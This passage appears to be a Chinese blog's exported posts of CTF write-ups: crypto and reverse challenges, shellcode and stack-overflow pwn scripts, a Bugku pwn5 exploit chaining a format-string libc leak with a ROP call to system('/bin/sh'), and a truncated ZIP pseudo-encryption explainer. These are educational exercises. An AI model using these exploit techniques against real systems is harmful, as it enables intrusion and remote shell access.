class="code"><pre><span class="line">strings = &amp;quot;f_tnluz_aghggeao&#123;t_oy_ldoia&#125;&amp;quot;</span><br><span class="line">flag = &amp;quot;&amp;quot;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">3</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>解密之后得到的是一个base64加密的密文：<code>ZmxhZ3tjcnlwdG9faXNfaHhiX3NvX2VBc3kwfQ==</code>，在解密一次得到flag。</p><h4 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;crypto_is_hxb_so_eAsy0&#125;</code></p><h3 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h3><p>这题是栅栏密码，使用<a href="https://www.k2zone.cn/?p=1569">CTFcrack</a>提供的栅栏密码工具解密：</p><p><img src="https://i.loli.net/2019/10/21/ZiBbRDOLypn7q8U.png"></p><h4 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h4><p>第2栏：<code>flag&#123;yo_uget_itzha_lan_good&#125;</code></p><h3 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h3><p>这题提供较长的明文&amp;密文，尝试分析字频，得到<strong>单表替换</strong>中的对应表。</p><p><img src="https://i.loli.net/2019/10/21/GBdmWQTsFuHSj7K.png"></p><p>得到对应表之后，还原得到明文，获得flag</p><h4 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;eantosi&#125;</code></p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="baby-reverse"><a href="#baby-reverse" class="headerlink" title="baby reverse"></a>baby reverse</h3><p>这道题就是考察IDA的使用，IDA打开后，搜索（atl+t&amp;ctrl+t）flag即可。</p><p><img src="https://i.loli.net/2019/10/21/f1PQtdjmhpTGVyo.png"></p><h4 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;reverse_is_easy&#125;</code></p><h3 id="easy-reverse"><a href="#easy-reverse" class="headerlink" title="easy reverse"></a>easy reverse</h3><p>IDA打开，<code>main()</code>里面存在一个条件函数，如果<code>v1=v0</code>则输出<code>you are right!!</code>，否则输出<code>you are wrong!!</code>，推测出需要满足条件才能获得flag，即使<code>v1=v0</code>。<code>v0</code>被赋值为字符串<code>kanlxvdzTljyTfyTeuor</code>；<code>v1</code>是以参数为<code>v3</code>的<code>sub_401005</code>函数的返回值，<code>v3</code>为我们输入值。</p><p><img src="https://i.loli.net/2019/10/21/6hCR2TPDlyjB3Ak.png"></p><p><code>sub_401005</code>函数内部运算公式：</p><p><img src="https://i.loli.net/2019/10/21/5oRGbv2TMP1KBdQ.png"></p><p>操作就是将每一位输入字符都与<code>0xC</code>异或后加1。那么写个脚本将<code>v0</code>每一位都减1后与<code>0xC</code>异或得到我们应该输入的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strings = &amp;quot;kanlxvdzTljyTfyTeuor&amp;quot;</span><br><span class="line">flag = &amp;quot;&amp;quot;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">1</span>)^<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;crypto_is_hxb_so_eAsy0&#125;</code></p><h3 id="霸王别姬"><a href="#霸王别姬" class="headerlink" title="霸王别姬"></a>霸王别姬</h3><p>这题从描述到运行程序是的提示都是很明显地要脱壳。</p><p><img src="https://i.loli.net/2019/10/21/m7tpbzIE4y2nRfl.png"></p><p><img src="https://i.loli.net/2019/10/21/xCgSndGI4fleWJB.png"></p><p>通用脱壳软件脱壳一下，IDA打开<code>main</code>函数中直接就能找到flag</p><p><img src="https://i.loli.net/2019/10/21/ZaFupY41s9fwzrg.png"></p><p>这个加的是压缩壳<code>UPX</code>，与<code>pwnable.kr</code>中的<code>flag</code>那题有些类似，可以在linux下用命令脱壳。</p><h4 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;upx_so_easy_!&#125;</code></p><h3 id="电竞选手"><a href="#电竞选手" class="headerlink" title="电竞选手"></a>电竞选手</h3><p>IDA打开可以看见最后一个if条件，满足则输出<code>Correct!\nFlag is your input</code>，提示我们输入的让条件符合的值就是flag。条件成立的前提是<code>sub_401350(v4) &amp;&amp; sub_40145A()</code>两个函数的返回值相同。<code>sub_401350</code>的参数<code>v4</code>就是输入值。</p><p><img src="https://i.loli.net/2019/10/21/WP4Nxbapiq19yMl.png"></p><p><code>sub_401350</code>函数如下：</p><p><img src="https://i.loli.net/2019/10/21/F83p2VS4HXoYqyT.png"></p><p><em>选择case 后数值按<code>r</code>转换为字符</em></p><p>首先判断输入长度是否为32字节，然后取5~30位进入到循环结构，根据输入值的不同向<code>dword_405060</code>数组中写入不同的值，若无匹配则返回0。程序正常循环结束后会返回<code>1</code></p><p><code>sub_40145A</code>函数如下：</p><p><img src="https://i.loli.net/2019/10/21/EIQx5RliO7hMkWA.png"></p><p>主体是一个循环体：每次<code>v3</code>加上<code>数组dword_402068</code>的第<code>dword_405060[i]</code>位数；<code>v4</code>加上<code>数组dword_402078</code>的第<code>dword_405060[i]</code>位数。然后3个if条件，如果<code>v2\v3</code>大于9或者小于0；<code>byte_402000[10 * v3 + v2] == 3</code>则返回<code>0</code>。只有<code>byte_402000[10 * v3 + v2] == 43</code>才返回<code>1</code>。</p><p><code>dword_402068</code>、<code>dword_402078</code>两个数组值：</p><p><img src="https://i.loli.net/2019/10/21/dbfcxk64YGTSvgu.png"></p><p><code>byte_402000</code>数值值</p><p><img src="https://i.loli.net/2019/10/21/4XIFmPnx9VZToBk.png"></p><p>根据<code>sub_40145A()</code>内部结构，一开始推测是用<code>wasd</code>控制每次循环读取<code>byte_402000</code>的位置，也就是避开<code>#</code>、控制最后读取是<code>+</code>，但是发现长度不对。在师兄提点下发现是用一维数组代表二维数组，从这里看出来的：</p><p><img src="https://i.loli.net/2019/10/21/YBaJ5erWkcRVIOn.png"></p><p><code>10*v3</code>代表的是行号，还有给出提示一行有10个元素（v3+1就读取跳了10位，相当于读取下一行同一列的元素）。<code>v2</code>代表列号。以此将<code>byte_402000</code>数值的值转换为二维数组，如图所示：</p><p><img src="https://i.loli.net/2019/10/21/4pPK5ovG6dDxAzE.png"></p><p>出发点就是<code>v2\v3</code>的初始值，用<code>wasd</code>控制移动，最后移动到<code>+</code>。</p><h4 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;wwwwaaasssaassssdddssddddw&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>32位只开PIE保护</p><p><img src="https://i.loli.net/2019/10/21/l1WrJXvzLHQfwFx.png"></p><p>直接运行：</p><p><img src="https://i.loli.net/2019/10/21/IEbAnXaVgzfYJ8Q.png"></p><p>IDA打开发现直接程序将输入的，当成命令执行了。那么直接输入shellcode就行了。</p><p><img src="https://i.loli.net/2019/10/21/T8SkDXMtlVKq4xC.png"></p><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">p = process(&amp;quot;./shellcode&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;quot;139.199.10.70&amp;quot;,10003)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="simple-stackoverflow"><a href="#simple-stackoverflow" class="headerlink" title="simple_stackoverflow"></a>simple_stackoverflow</h3><p>32位保护全关</p><p><img src="https://i.loli.net/2019/10/21/mkil1sFO69yCLdg.png"></p><p>直接运行：</p><p><img src="https://i.loli.net/2019/10/21/yVNpjnbGex3rXSA.png"></p><p>IDA分析，在<code>main()</code>里面的<code>overflow()</code>里面，变量<code>buf</code>距离栈底为<code>0x20</code>，而<code>read</code>可以从终端输入取最多<code>0x3FF</code>字节写入到<code>buf</code>中，这里就存在<strong>栈溢出</strong>。</p><p><img src="https://i.loli.net/2019/10/21/notYXBFqyhTAZ63.png"></p><p>这里利用栈溢出控制指针，再次调用read函数向某地址写入shellcode之后，然后控制指针运行到shellcode。写入地址选择固定地址如bss段、data段（地址在IDA ctrl+s 查找），我就选择写入</p><p><img src="https://i.loli.net/2019/10/21/JtCkh64BWxSv27D.png"></p><p>然后问题就是怎么给溢出后调用的read传参。read函数有三个参数，32位传参看图：</p><p><img src="https://i.loli.net/2019/10/21/x93fAE4KZreycT2.png"></p><h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p = process(&amp;quot;./simple_stackoverflow&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;quot;139.199.10.70&amp;quot;,10004)</span></span><br><span class="line"></span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039; * (0x20 + 0x4) + p32(0x08048390) + p32(0x0804A040) + p32(0) + p32(0x0804A040) + p32(len(shellcode))</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>覆写eip的read函数地址应该是plt表中read地址，而不是read函数地址。即填入IDA中<code>_read</code>地址，而不是<code>read</code>地址</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 海啸杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-Pwn5</title>
      <link href="archives/32/"/>
      <url>archives/32/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>2019年12月15日更新</strong></p><p>学完ROP之后，重新做一下题目。bugku 5道 pwn 挺适合在学完 ROP 之后用来练习的。</p><p><del>网上对 pwn5 的 wp 视乎好像不是太详细，就做一篇比较详细解释的。</del></p><p>或者说是基于<a href="https://blog.csdn.net/kety_gz/article/details/100516666">橘小白</a>wp的补充 XD</p><hr><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>看一下保护，只开了NX。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NreWVkYWk5MTAvUGljYmVkL21hc3Rlci9pbWcvcHduNS1idWdrdS1jaGVja3NlYy5wbmc?x-oss-process=image/format,png"></p><p>没有危险函数，如system、getshell等</p><p><img src="https://img-blog.csdnimg.cn/20190903183652137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tldHlfZ3o=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>main 函数中存在两个漏洞。首先是第10行的 printf 存在<strong>格式化字符串漏洞</strong>；其次是17行的 read 存在<strong>栈溢出</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;::s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;amp;s, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;amp;s, &amp;amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;byte_400978);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400998);</span><br><span class="line">  read(<span class="number">0</span>, &amp;amp;s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(&amp;amp;s, &amp;amp;needle) || !<span class="built_in">strstr</span>(&amp;amp;s, &amp;amp;dword_4009BA) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;amp;byte_4009C8);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;amp;byte_4009F8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>18 行的 if 满足条件是第二次输入值含有数组<code>&amp;needle</code>和<code>&amp;dword_4009BA</code>的内容。直接查看变量值(双击变量)是得不到任何字符，因为里面存储的是中文，查看方法应该是选中变量后，打开 ida 的 hex view 窗口，并结合数组存储的十六进制数查看。这里就展示查看 needle：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NreWVkYWk5MTAvUGljYmVkL21hc3Rlci9pbWcvMjAxOTEyMTUxMTM2NDYucG5n?x-oss-process=image/format,png"></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这道题目首先需要用格式化字符串漏洞泄露存储在 rip 中 __libc_main 的地址，然后利用栈溢出覆写 rip 为 system 地址。</p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>要泄露libc，就需要知道 rip 对于指针的偏移位置。而 rip 的偏移可以基于变量 s 的偏移计算出来。那么是需要先找变量 s 的偏移。怎么找，就不再造轮子了，现成<a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0">轮子</a>。</p><p>给出查找脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">p = process(&amp;quot;./human&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;?\n&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;aaaa%&#123;&#125;$p&amp;quot;.<span class="built_in">format</span>(n))</span><br><span class="line">recv = p.recvuntil(&amp;quot;?\n&amp;quot;)</span><br><span class="line"><span class="built_in">print</span> recv</span><br><span class="line"><span class="keyword">if</span> &amp;<span class="comment">#039;61616161&amp;#039; in recv:</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>得出 s 偏移为 6。s 与 rbp 的距离是 0x20，那么 rip 的偏移为 11。</p><p>泄露出返回地址后，就需要基于这个地址计算出 system 的地址和 /bin/sh地址。由于题目没有给出 libc.so 文件，那么我们查询程序调用的libc，并复制到目录下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;gt;$ ldd human</span><br><span class="line">linux-vdso.so.1 =&amp;gt;  (0x00007ffff7ffa000)</span><br><span class="line">libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a0d000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)</span><br><span class="line">&amp;gt;$ cp /lib/x86_64-linux-gnu/libc.so.6 libc.so</span><br></pre></td></tr></table></figure><p>还要注意一点的是，泄露出来的是<code>__libc_start_main+240</code>，所以计算地址时，需要减去240。</p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>程序是64位，也就是寄存器传参。我们就利用 ROPgadget 查一下 libc.so 文件中 pop_rdi_ret 的地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so --only &amp;quot;pop|ret&amp;quot;</span><br></pre></td></tr></table></figure><p>构造的 payload 需要含有 <code>鸽子</code>、<code>真香</code>，填充长度为 0x28。然后依次 gadget、binsh、system。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移计算</span></span><br><span class="line">&amp;<span class="comment">#039;&amp;#039;&amp;#039;</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">p = process(&amp;quot;./human&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;?\n&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;aaaa%&#123;&#125;$p&amp;quot;.<span class="built_in">format</span>(n))</span><br><span class="line">recv = p.recvuntil(&amp;quot;?\n&amp;quot;)</span><br><span class="line"><span class="built_in">print</span> recv</span><br><span class="line"><span class="keyword">if</span> &amp;<span class="comment">#039;61616161&amp;#039; in recv:</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n += <span class="number">1</span></span><br><span class="line">&amp;<span class="comment">#039;&amp;#039;&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p = process(&amp;quot;./human&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;quot;114.116.54.89&amp;quot;, &amp;quot;10005&amp;quot;)</span></span><br><span class="line">elf = ELF(&amp;quot;./human&amp;quot;)</span><br><span class="line">libc = ELF(&amp;quot;./libc.so&amp;quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400933</span> <span class="comment"># ROPgadget查到的地址</span></span><br><span class="line">gezi = &amp;quot;鸽子&amp;quot;</span><br><span class="line">zhenxiang = &amp;quot;真香&amp;quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak __libc_start_main</span></span><br><span class="line">print p.recvuntil(&amp;quot;?\n&amp;quot;)</span><br><span class="line">p.send(&amp;quot;%<span class="number">11</span>$p&amp;quot;)</span><br><span class="line">main_addr = <span class="built_in">eval</span>(p.recvuntil(&amp;quot;%<span class="number">11</span>$p&amp;quot;,<span class="literal">True</span>))-<span class="number">240</span></span><br><span class="line">log.info(&amp;quot;main_addr = &amp;quot;+<span class="built_in">hex</span>(main_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc_base_addr</span></span><br><span class="line">libc_addr = main_addr - libc.symbols[&amp;<span class="comment">#039;__libc_start_main&amp;#039;]</span></span><br><span class="line">log.info(&amp;quot;main_addr = &amp;quot;+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak system_addr</span></span><br><span class="line">system_addr = libc_addr + libc.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line">log.info(&amp;quot;system_addr = &amp;quot;+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak /bin/sh</span></span><br><span class="line">binsh_addr = libc_addr + libc.search(&amp;quot;/<span class="built_in">bin</span>/sh&amp;quot;).<span class="built_in">next</span>()</span><br><span class="line">log.info(&amp;quot;binsh_addr = &amp;quot;+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># overflow</span></span><br><span class="line">print p.recvuntil(&amp;quot;还有什么本质?&amp;quot;)</span><br><span class="line">payload = (gezi+zhenxiang).ljust(<span class="number">0x20</span>+<span class="number">8</span>,&amp;quot;A&amp;quot;)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NreWVkYWk5MTAvUGljYmVkL21hc3Rlci9pbWcvMjAxOTEyMTUxMjA5MDYucG5n?x-oss-process=image/format,png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/kety_gz/article/details/100516666#commentsedit">BugkuCTF pwn1 pwn2 pwn4 pwn5 pwn3 详细writeup【橘小白】</a></p><p><a href="%5Bhttps://www.mi1k7ea.com/2019/04/09/%E8%92%B8%E7%B1%B3ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%5D(https://www.mi1k7ea.com/2019/04/09/%E8%92%B8%E7%B1%B3ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)">蒸米32位及64位ROP笔记</a></p><p><a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0">格式化字符串漏洞学习</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> ROP </tag>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZIP压缩包伪加密</title>
      <link href="archives/34/"/>
      <url>archives/34/</url>
      
        <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>ZIP文件的16进制文件可以分为<strong>压缩源文件数据区</strong>、<strong>压缩源文件目录区</strong>、<strong>压缩源文件目录结束标志</strong>。</p><p>每个区都有对应的文件头标记，结合实际16进制文件来解释各区的文件头信息。</p><h3 id="压缩源文件数据区"><a href="#压缩源文件数据区" class="headerlink" title="压缩源文件数据区"></a>压缩源文件数据区</h3><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200224162152.png" alt="压缩源文件数据区"></p><table><thead><tr><th align="center">16进制文件数据</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">50 4B 03 04</td><td align="center">zip类型头文件标识</td></tr><tr><td align="center">14 00</td><td align="center">解压文件所需要pkware版本</td></tr><tr><td align="center">00 00</td><td align="center">全局方式位标记（有无加密）</td></tr><tr><td align="center">08 00</td><td align="center">压缩方式</td></tr><tr><td align="center">70 02</td><td align="center">最后修改文件时间</td></tr><tr><td align="center">01 4B</td><td align="center">最后修改文件日期</td></tr><tr><td align="center">B7 EF DC 83</td><td align="center">CRC-32校验（1480B516）</td></tr><tr><td align="center">03 00 00 00</td><td align="center">压缩后尺寸（3B）</td></tr><tr><td align="center">01 00 00 00</td><td align="center">未压缩尺寸（23）</td></tr><tr><td align="center">05 00</td><td align="center">文件名长度</td></tr><tr><td align="center">00 00</td><td align="center">扩展记录长度</td></tr></tbody></table><h3 id="压缩源文件目录区"><a href="#压缩源文件目录区" class="headerlink" title="压缩源文件目录区"></a>压缩源文件目录区</h3><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200224162239.png" alt="压缩源文件目录区"></p><table><thead><tr><th align="center">16进制文件数据</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">50 4B 01 02</td><td align="center">目录中文件文件头标记</td></tr><tr><td align="center">1F 00</td><td align="center">压缩使用的 pkware 版本</td></tr><tr><td align="center">14 00</td><td align="center">解压文件所需 pkware 版本</td></tr><tr><td align="center">00 00</td><td align="center">全局方式位标记（有无加密）</td></tr><tr><td align="center">08 00</td><td align="center">压缩方式</td></tr><tr><td align="center">70 02</td><td align="center">最后修改文件时间</td></tr><tr><td align="center">01 4B</td><td align="center">最后修改文件日期</td></tr><tr><td align="center">B7 EF DC 83</td><td align="center">CRC-32校验（1480B516）</td></tr></tbody></table><h3 id="压缩源文件目录结束标志"><a href="#压缩源文件目录结束标志" class="headerlink" title="压缩源文件目录结束标志"></a>压缩源文件目录结束标志</h3><p><img src="https://i.loli.net/2019/10/15/6L8p9sxDwemQHUI.png" alt="压缩源文件目录结束标志"></p><table><thead><tr><th align="center">16进制文件数据</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">50 4B 05 06</td><td align="center">目录结束标志</td></tr><tr><td align="center">00 00</td><td align="center">当前磁盘变薄</td></tr><tr><td align="center">00 00</td><td align="center">目录区开始磁盘编号</td></tr><tr><td align="center">01 00</td><td align="center">本磁盘上记录总数</td></tr><tr><td align="center">01 00</td><td align="center">目录区中记录总数</td></tr><tr><td align="center">81 00 00 00</td><td align="center">目录区尺寸大小</td></tr><tr><td align="center">50 00 